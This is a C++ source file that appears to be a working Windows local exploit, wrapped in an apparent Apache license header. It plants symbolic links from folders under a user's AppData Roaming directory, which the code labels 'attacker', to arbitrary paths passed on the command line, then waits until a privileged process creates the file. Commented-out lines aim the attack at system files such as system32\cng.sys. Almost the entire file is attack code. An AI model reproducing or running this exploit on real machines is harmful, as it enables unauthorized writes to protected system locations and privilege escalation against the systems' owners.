//  Copyright 2020 Neurosoft Inc. All Rights Reserved.
//
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//  http ://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

#include "stdafx.h"

#include <FileSymlink.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <sys/stat.h>
#include <Shlwapi.h>

//using namespace std;



inline bool FileExists(const LPCWSTR& name) {
	struct _stat buf;
	return (_wstat(name, &buf) == 0);
}

void cls()
{
	system("@cls||clear");
}
int _tmain()
{

	HANDLE exploit = GetCurrentThread();
	SetThreadPriority(exploit, THREAD_PRIORITY_TIME_CRITICAL);

	PWSTR cmdline = GetCommandLineW();
	int argc;
	PWSTR* argv = CommandLineToArgvW(cmdline, &argc);
	LPCWSTR createFile = argv[1];
	LPCWSTR createFile2 = argv[2];
	//LPCWSTR createFile = L"C:\\windows\\system32\\cng.sys";
	//LPCWSTR createFile2 = L"C:\\windows\\cng.sys";;
	bool retval = false;


	DWORD dwAttr = GetFileAttributes(L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\");
	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
	{
		std::wcout << "C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows is NOT empty! \n\n" << std::endl;
		std::wcout << "Run the exploit again! \n\n" << std::endl;
		return 0;
	}
	else {
		std::wcout << "C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows is empty! \n\n" << std::endl;
		;
	}

	
	std::wstring symlink1 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\AccountPictures";
	std::wstring symlink2 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore";
	std::wstring symlinkLibraries_Important = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Libraries";
	std::wstring symlink3 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Network";
	std::wstring symlink4 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Printer Shortcuts";
	std::wstring symlinkRecent_Important = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Recent";
	std::wstring symlink5 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\SendTo";
	std::wstring symlink6 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu";
	std::wstring symlink7 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Templates";
	std::wstring symlink8 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Themes";
	std::wstring symlink9 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs";
	std::wstring symlink10 = L"C:\\Users\\attacker\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell";

	std::wstring target1 = L"C:\\Users\\attacker\\Desktop\\AccountPictures";
	std::wstring target2 = L"C:\\Users\\attacker\\Desktop\\CloudStore";
	std::wstring targetLibraries_Important = createFile;
	std::wstring target3 = L"C:\\Users\\attacker\\Desktop\\Network";
	std::wstring target4 = L"C:\\Users\\attacker\\Desktop\\Printer Shortcuts";
	std::wstring targetRecent_Important = createFile2;
	std::wstring target5 = L"C:\\Users\\attacker\\Desktop\\SendTo";
	std::wstring target6 = L"C:\\Users\\attacker\\Desktop\\Start Menu";
	std::wstring target7 = L"C:\\Users\\attacker\\Desktop\\Templates";
	std::wstring target8 = L"C:\\Users\\attacker\\Desktop\\Themes";
	std::wstring target9 = L"C:\\Users\\attacker\\Desktop\\Start Menu\\Programs";
	std::wstring target10 = L"C:\\Users\\attacker\\Desktop\\PowerShell";

	LPCWSTR baseobjdir = nullptr;

	bool permanent = true;
	FileSymlink csv(permanent);

	//cls();
	csv.CreateSymlink(symlink1.c_str(), target1.c_str(), baseobjdir);
	Sleep(10000);
	csv.CreateSymlink(symlink2.c_str(), target2.c_str(), baseobjdir);
	csv.CreateSymlink(symlinkLibraries_Important.c_str(), targetLibraries_Important.c_str(), baseobjdir);
	csv.CreateSymlink(symlink3.c_str(), target3.c_str(), baseobjdir);
	csv.CreateSymlink(symlink4.c_str(), target4.c_str(), baseobjdir);
	csv.CreateSymlink(symlinkRecent_Important.c_str(), targetRecent_Important.c_str(), baseobjdir);
	csv.CreateSymlink(symlink5.c_str(), target5.c_str(), baseobjdir);
	csv.CreateSymlink(symlink6.c_str(), target6.c_str(), baseobjdir);
	csv.CreateSymlink(symlink7.c_str(), target7.c_str(), baseobjdir);
	csv.CreateSymlink(symlink8.c_str(), target8.c_str(), baseobjdir);
	csv.CreateSymlink(symlink9.c_str(), target9.c_str(), baseobjdir);
	csv.CreateSymlink(symlink10.c_str(), target10.c_str(), baseobjdir);
	//cls();
	std::wcout << "Enjoy your black backgroud and play a game :-) ... \n\n" << std::endl;




	// Search for the presence of a file with a true result.
	Wow64DisableWow64FsRedirection(NULL);
	do {
		retval = FileExists(createFile);
	} while (retval != true);


	//std::wcout << "The file " << createFile << " was Created\n\n" << std::endl;
	std::wcout << "Gweeperx killed the witch\n\n" << std::endl;
	std::wcout << "Folder "<< createFile << " has been created\n\n" << std::endl;

	return 0;
	
}
